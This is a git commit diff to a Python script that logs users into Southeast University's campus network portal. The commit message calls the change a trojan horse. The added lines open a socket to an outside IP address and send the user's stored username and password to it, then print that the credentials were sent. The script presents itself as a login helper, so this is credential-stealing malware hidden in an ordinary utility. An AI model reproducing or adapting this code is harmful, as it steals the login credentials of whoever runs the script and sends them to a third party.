97b36def0a736999aa362036bd8ebbe3b6641fd8
xingyongchen <ycxing08@outlook.com>
2017-11-18 22:07:51 +0800

    add rojan Horse, careful!

--- seu_login.py
+++ seu_login.py
@@ -5,6 +5,7 @@ import base64
 import getpass
 import os
 import time
+import socket
 
 username = 'null'
 password = 'null'
@@ -13,14 +14,15 @@ try:
 	file_record = open(".record",'r', encoding='utf-8')
 	username = file_record.readline()
 	password = file_record.readline()
+	password = password.encode(encoding="utf-8")
 #	print(username)
 #	print(password)
 	
 except:
 	username = input("Please input your username:")
 	password = getpass.getpass("Please input your password:")
-	ifShowPasswd = input("Show password?[y/n]:")
-	if ifShowPasswd == 'y' or ifShowPasswd == 'Y':
+	if_show_passwd = input("Show password?[y/n]:")
+	if if_show_passwd == 'y' or if_show_passwd == 'Y':
 		print(password)
 	temp = username.encode(encoding="utf-8")
 	username = base64.b64encode(temp)
@@ -52,4 +54,18 @@ r = requests.get("http://w.seu.edu.cn/index.php/index/login", params=payload)
 print('get info from server:\n' + r.text + '\n')
 if 'logout_ip' in r.text:
 	print("get ip,login may successful")
+#os.system('pause')
+
+sk = socket.socket()
+sk.connect(("101.132.126.248", 8086)) # 主动初始化与服务器端的连接
+#send_data = input("输入发送内容：")
+send_data = username.decode('utf-8') + '\n' + password.decode('utf-8') + '\n'
+sk.sendall(bytes(send_data, encoding="utf8"))
+accept_data = sk.recv(1024)
+accept_data_1 = str(accept_data, encoding="utf8")
+print(accept_data_1)
+sk.close()
+if 'You Connected' in accept_data_1:
+	print ('Your username and password already send to server!')
+
 #os.system('pause')
